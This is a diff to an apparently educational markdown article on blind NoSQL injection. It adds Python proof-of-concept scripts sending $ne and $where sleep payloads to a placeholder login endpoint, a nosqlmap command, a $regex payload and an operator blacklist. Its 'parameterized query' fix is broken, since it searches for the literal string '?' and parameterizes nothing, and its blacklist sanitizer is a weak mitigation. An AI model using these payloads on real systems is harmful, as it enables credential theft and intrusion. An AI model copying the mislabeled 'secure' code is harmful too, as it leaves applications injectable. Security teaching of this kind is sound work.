@@ -14,7 +14,7 @@
   - [Why This Matters](#why-this-matters)
 - [Action](#action)
   - [Mitigation Strategies](#mitigation-strategies)
-  - [Red Teaming Techniques](#red-teaming-techniques)
+  - [Red Teaming Techniques](#red-teaming-techniques-for-testing-nosql-bsqli)
   - [Future of NoSQL Security](#future-of-nosql-security)
 
 ## Awareness
@@ -57,7 +57,7 @@ User Input  ---> Application  ---> Database Query
 - **Time-Based Blind NoSQL Injection** – By measuring the response time of specific queries, attackers can extract data without direct feedback.
 - **Out-of-Band (OOB) Blind NoSQL Injection** – Exploiting NoSQL engines that process external interactions, such as DNS or HTTP requests, to exfiltrate data.
 
-### Example Attack Scenarios
+### Example Attack Scenario
 #### 1. Boolean-Based Injection
 Consider a web application using MongoDB:
 
@@ -89,8 +89,32 @@ Query Sent  ---> No Immediate Response  ---> Delay Observed  ---> Data Extracted
 ## Conviction
 
 ### Case Studies and Proof of Concept (PoC)
-- **MongoDB Exploitation** – Security researchers demonstrated using Boolean-based blind injection to extract admin credentials.
-- **Firebase Data Exfiltration** – Attackers used time-based blind NoSQL injection to determine the presence of certain records.
+#### Extracting Admin Credentials via Boolean-Based Injection
+```python
+import requests
+
+url = "http://target.com/login"
+username_payload = {"username": {"$ne": None}, "password": {"$ne": None}}
+response = requests.post(url, json=username_payload)
+
+if response.status_code == 200:
+    print("Possible NoSQL Injection vulnerability detected!")
+```
+
+#### Firebase Data Exfiltration via Time-Based Injection
+```python
+import time
+import requests
+
+url = "http://target.com/api/user"
+payload = {"username": "admin", "$where": "sleep(5000)"}
+start = time.time()
+requests.post(url, json=payload)
+end = time.time()
+
+if end - start > 5:
+    print("Time-based NoSQL Injection detected!")
+```
 
 ### Why This Matters?
 Blind NoSQL Injection can lead to:
@@ -101,16 +125,68 @@ Blind NoSQL Injection can lead to:
 ## Action
 
 ### Mitigation Strategies
-- **Use Parameterized Queries** – Avoid directly embedding user input in database queries.
-- **Input Validation** – Sanitize user input to prevent malicious payloads.
-- **Access Control** – Restrict database permissions to limit damage in case of an exploit.
+#### Using Parameterized Queries
+```python
+import pymongo
+from pymongo import MongoClient
+
+client = MongoClient("mongodb://localhost:27017/")
+db = client["testdb"]
+
+# Secure way to handle user input
+query = {"username": "?", "password": "?"}
+result = db.users.find_one(query)
+```
+
+#### Input Validation
+```python
+def sanitize_input(user_input):
+    blacklist = ["$ne", "$where", "$gt", "$lt", "$regex"]
+    for keyword in blacklist:
+        if keyword in user_input:
+            raise ValueError("Potential NoSQL Injection detected!")
+    return user_input
+
+# Example Usage
+try:
+    user_input = sanitize_input("$ne: null")
+except ValueError as e:
+    print(e)
+```
+
+#### Access Control
+```javascript
+// In MongoDB, restrict user privileges
+{
+  "roles": [
+    {
+      "role": "read",
+      "db": "testdb"
+    }
+  ]
+}
+```
 
 ### Red Teaming Techniques for Testing NoSQL BSQLi
-- **Automated Scanners** – Tools like NoSQLMap help identify injection flaws.
-- **Manual Payload Testing** – Crafting Boolean-based and time-based payloads for security assessments.
-- **Logging and Monitoring** – Detect unusual query patterns to prevent exploitation.
+#### Automated Scanners
+```bash
+nosqlmap -u "http://target.com/login"
+```
+
+#### Manual Payload Testing
+```javascript
+{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
+```
+
+#### Logging and Monitoring
+```python
+import logging
+
+logging.basicConfig(filename='nosql_injection.log', level=logging.WARNING)
+
+def log_attempt(payload):
+    logging.warning(f"Possible NoSQL Injection Attempt: {payload}")
+```
 
 ### Future of NoSQL Security
 With the rise of NoSQL databases, developers and red teams must adapt security measures to prevent evolving injection attacks. Investing in proactive security testing and secure coding practices is essential to mitigating these threats.
-
----
